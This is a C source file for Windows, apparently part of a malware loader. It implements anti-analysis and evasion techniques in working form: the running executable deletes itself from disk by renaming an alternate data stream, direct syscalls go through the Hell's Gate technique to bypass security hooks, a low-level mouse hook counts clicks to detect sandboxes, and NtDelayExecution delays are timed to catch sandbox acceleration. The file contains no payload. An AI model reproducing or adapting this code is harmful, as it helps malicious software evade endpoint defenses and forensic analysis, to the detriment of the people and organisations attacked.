#include "Common.h"

HHOOK g_hMouseHook = NULL;
DWORD g_dwMouseClicks = 0;

BOOL SelfDelete() {
	NTSTATUS status = 0;

	DWORD dwFilePathBufferSize = MAX_PATH * 2;
	LPWSTR pFilePathBuffer = (LPWSTR)HeapAlloc(
		GetProcessHeap(),
		HEAP_ZERO_MEMORY,
		dwFilePathBufferSize * sizeof(WCHAR)
	);
	if (!pFilePathBuffer) {
		printf("[!] HeapAlloc Failed With Error: 0x%0.8X \n", GetLastError());
		return FALSE;
	}

	// Get the path of the current executable
	if (!g_Api.pGetModuleFileNameW(NULL, pFilePathBuffer, dwFilePathBufferSize)) {
		printf("[!] GetModuleFileNameW Failed With Error: 0x%0.8X \n", GetLastError());
		return FALSE;
	}
	//wprintf(L"[+] FilePath: %ls\n", pFilePathBuffer);

	// Opening a handle to the current file
	HANDLE hFile = g_Api.pCreateFileW(
		pFilePathBuffer,
		DELETE | SYNCHRONIZE,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		0,
		NULL
	);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileW Failed With Error: 0x%0.8X \n", GetLastError());
		return FALSE;
	}

	// The new data stream name
	PCWSTR NewStream = (PCWSTR)NEW_STREAM;
	SIZE_T NewStreamSize = StringLengthW(NewStream) * sizeof(WCHAR);
	SIZE_T sFileRenameInfo = sizeof(FILE_RENAME_INFO) + NewStreamSize;

	// Allocating enough buffer for the 'FILE_RENAME_INFO' structure
	PFILE_RENAME_INFORMATION pFileRenameInfo = (PFILE_RENAME_INFORMATION)HeapAlloc(
		GetProcessHeap(),
		HEAP_ZERO_MEMORY,
		sFileRenameInfo
	);
	if (!pFileRenameInfo) {
		printf("[!] HeapAlloc Failed With Error : 0x%0.8X \n", GetLastError());
		return FALSE;
	}

	// Setting the new data stream name buffer and size in the 'FILE_RENAME_INFO' structure
	pFileRenameInfo->FileNameLength = (DWORD)NewStreamSize;
	CopyMemoryEx(pFileRenameInfo->FileName, NewStream, pFileRenameInfo->FileNameLength);

	// Renaming the data stream
	if (!g_Api.pSetFileInformationByHandle(
		hFile,
		FileRenameInfo,
		pFileRenameInfo,
		(DWORD)sFileRenameInfo
	)) {
		printf("[!] SetFileInformationByHandle [R] Failed With Error: 0x%0.8X \n", GetLastError());
		return FALSE;
	}

	// Closing the file handle
	HellsGate(g_SyscallsTable.NtClose.wSystemCall);
	if ((status = HellDescent(hFile)) != 0x0) {
		printf("[!] NtClose Failed With Error : 0x%0.8X \n", status);
		return FALSE;
	}

	// Re-opening a handle to the current file for refreshing
	hFile = g_Api.pCreateFileW(
		pFilePathBuffer,
		DELETE | SYNCHRONIZE,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		0,
		NULL
	);
	if (hFile == INVALID_HANDLE_VALUE) {
		if (GetLastError() == ERROR_FILE_NOT_FOUND) {
			return TRUE;
		}
		else {
			printf("[!] CreateFileW Failed With Error: 0x%0.8X \n", GetLastError());
			return FALSE;
		}
	}

	// Marking the file for deletion (used in the 2nd SetFileInformationByHandle call)
	FILE_DISPOSITION_INFO fileDispositionInfo = {
		.DeleteFile = TRUE
	};

	// Marking for deletion after the file's handle is closed
	if (!g_Api.pSetFileInformationByHandle(
		hFile,
		FileDispositionInfo,
		&fileDispositionInfo,
		sizeof(fileDispositionInfo)
	)) {
		printf("[!] SetFileInformationByHandle [D] Failed With Error : 0x%0.8X \n", GetLastError());
		return FALSE;
	}

	// Close the handle for deleting the file
	HellsGate(g_SyscallsTable.NtClose.wSystemCall);
	if ((status = HellDescent(hFile)) != 0x0) {
		printf("[!] NtClose Failed With Error : 0x%0.8X \n", status);
		return FALSE;
	}

	HeapFree(GetProcessHeap(), 0, pFilePathBuffer);
	HeapFree(GetProcessHeap(), 0, pFileRenameInfo);

	return TRUE;
}

LRESULT MouseHookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
	if (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN || wParam == WM_MBUTTONDOWN) {
		printf("[ # ] Mouse Clicked \n");
		g_dwMouseClicks++;
	}

	return g_Api.pCallNextHookEx(NULL, nCode, wParam, lParam);
}

BOOL InstallMouseHook() {
	MSG         Msg = { 0 };

	g_hMouseHook = g_Api.pSetWindowsHookExW(
		WH_MOUSE_LL,
		(HOOKPROC)MouseHookCallback,
		NULL,
		NULL
	);
	if (!g_hMouseHook) {
		printf("[!] SetWindowsHookExW Failed With Error : %d\n", GetLastError());
		return FALSE;
	}

	// Process unhandled events
	while (g_Api.pGetMessageW(&Msg, NULL, 0, 0)) {
		g_Api.pDefWindowProcW(Msg.hwnd, Msg.message, Msg.wParam, Msg.lParam);
	}

	return TRUE;
}

BOOL DelayExec(DWORD dwMilliSeconds) {
	NTSTATUS status = 0;
	LONGLONG delay = 0;
	LARGE_INTEGER delayInterval = { 0 };

	delay = (LONGLONG)dwMilliSeconds * 10000;
	delayInterval.QuadPart = -delay;

	printf("[i] Delaying Execution Using \"NtDelayExecution\" For %0.3d Seconds", (dwMilliSeconds / 1000));

	DWORD T0 = g_Api.pGetTickCount64();

	HellsGate(g_SyscallsTable.NtDelayExecution.wSystemCall);
	status = HellDescent(
		FALSE,
		&delayInterval
	);
	if (status && status != STATUS_TIMEOUT) {
		printf("[!] NtDelayExecution Failed With Error: 0x%0.8X \n", status);
		return FALSE;
	}

	DWORD T1 = g_Api.pGetTickCount64();

	if ((DWORD)(T1 - T0) < dwMilliSeconds)
		return FALSE;

	printf("\n\t>> _T1 - _T0 = %d \n", (DWORD)(T1 - T0));
	printf("[+] DONE \n");

	return TRUE;
}


BOOL AntiAnalysis(DWORD dwMilliSeconds)
{
	NTSTATUS		status = 0x0;
	HANDLE			hThread = NULL;
	LONGLONG		delay = 0;
	LARGE_INTEGER	delayInterval = { 0 };
	DWORD			i = 0;

	// Self-Delete the file on disk
	if (!SelfDelete()) {
		// Do something
	}

	while (++i <= 10) {
		printf("[#] Monitoring Mouse-Clicks For %d Seconds - Need %d Clicks To Pass\n", (dwMilliSeconds / 1000), REQUIRED_CLICKS);

		// Creating a thread that runs 'InstallMouseHook' function
		HellsGate(g_SyscallsTable.NtCreateThreadEx.wSystemCall);
		status = HellDescent(
			&hThread,
			THREAD_ALL_ACCESS,
			NULL,
			GetCurrentProcessHandle(),
			InstallMouseHook,
			NULL, NULL, NULL, NULL, NULL, NULL
		);

		if (status) {
			printf("[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n", status);
			return FALSE;
		}

		// Waiting for the thread for 'dwMilliSeconds'
		HellsGate(g_SyscallsTable.NtWaitForSingleObject.wSystemCall);
		delay = (LONGLONG)dwMilliSeconds * 10000;
		delayInterval.QuadPart = -delay;
		status = HellDescent(
			hThread,
			FALSE,
			&delayInterval
		);

		if (status && status != STATUS_TIMEOUT) {
			printf("[!] NtWaitForSingleObject Failed With Error : 0x%0.8X \n", status);
			return FALSE;
		}

		HellsGate(g_SyscallsTable.NtClose.wSystemCall);
		status = HellDescent(hThread);

		if (status) {
			printf("[!] NtClose Failed With Error : 0x%0.8X \n", status);
			return FALSE;
		}

		// Unhooking
		if (g_hMouseHook && g_Api.pUnhookWindowsHookEx(g_hMouseHook) == FALSE) {
			printf("[!] UnhookWindowsHookEx Failed With Error : %d \n", GetLastError());
			return FALSE;
		}
		printf("[+] DONE!\n");


		// Delaying execution for specific amount of time
		FLOAT delayTime = i * 10000;
		if (!DelayExec((DWORD)(delayTime / 2)))
			return FALSE;

		// If the user clicked more than REQUIRED_CLICKS times, we return true
		if (g_dwMouseClicks > REQUIRED_CLICKS)
			return TRUE;
		// If not, we reset the mouse-clicks variable, and monitor the mouse-clicks again
		else {
			g_dwMouseClicks = 0;
		}
	}

	return TRUE;
}